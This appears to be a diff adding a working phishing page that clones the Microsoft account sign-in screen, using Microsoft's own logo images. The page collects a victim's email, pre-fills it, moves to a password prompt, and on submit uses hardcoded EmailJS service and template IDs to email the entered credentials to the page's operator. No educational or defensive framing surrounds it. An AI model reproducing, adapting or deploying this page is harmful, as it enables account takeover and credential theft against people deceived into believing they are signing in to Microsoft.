@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+
+    <title>Live Signin Page Clone</title>
+</head>
+<body>
+
+    <div class="container">
+        <form id="form">
+            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" placeholder="Email, Phone, or Skype" name="email" id="email">
+
+                        </div>
+                        <p>No aacount? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second" id="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" placeholder="Password"  name="Password" id="Password">
+
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="submit" id="button">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+
+<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('voEnQ6-qZ-1XtQOhX')
+</script>
+<script>
+const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_ipjpfbm';
+   const templateID = 'template_2rb2673';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
+    <script>
+       
+
+       
+    </script>
+   
+   <script>
+    
+
+    window.onload = function() {
+        
+        var userInfo = getUserInfoFromCookie();
+
+        document.getElementById('email').value = userInfo.email;
+        window.location.href = '#second';
+
+            
+    
+    }
+    function getUserInfoFromCookie() {
+       
+            return {
+               
+                email: 'johndoe@example.com',
+                
+            };
+        }
+
+
+
+
+  </script>
+</body>
+</html>
